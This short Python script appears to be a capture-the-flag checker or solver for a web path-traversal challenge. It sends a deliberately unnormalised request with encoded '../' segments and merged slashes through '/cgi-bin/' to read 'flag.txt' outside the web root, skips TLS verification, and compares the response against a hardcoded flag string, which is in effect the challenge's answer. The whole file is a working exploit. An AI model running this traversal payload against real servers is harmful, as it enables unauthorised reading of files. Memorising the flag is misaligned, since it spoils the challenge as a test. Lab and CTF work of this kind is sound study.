import requests
import urllib.parse as urlparse

# SSL Warning
# import urllib3
# urllib3.disable_warnings()


def web_traversal(host):
    if "http" not in host:
        host = "https://" + host

    # connect check (main page)
    try:
        res = requests.get(urlparse.urljoin(host, "/"), timeout=3)
        res.raise_for_status()
    except Exception:
        return 2

    # check (secret page)
    try:
        url = host + "////cgi-bin/.%2e/.%2e/.%2e/.%2e/flag.txt"
        s = requests.Session()
        req = requests.Request(
            method="GET",
            url=url,
        )
        prep = req.prepare()
        prep.url = url
        res = s.send(prep, verify=False, timeout=3)
        if "FLAG{n61nx_w34k_c0nf16_m3r63_5l45h35}" in res.text:
            return 0
        else:
            return 1
    except Exception:
        return 1


if __name__ == "__main__":
    print(web_traversal("http://localhost"))
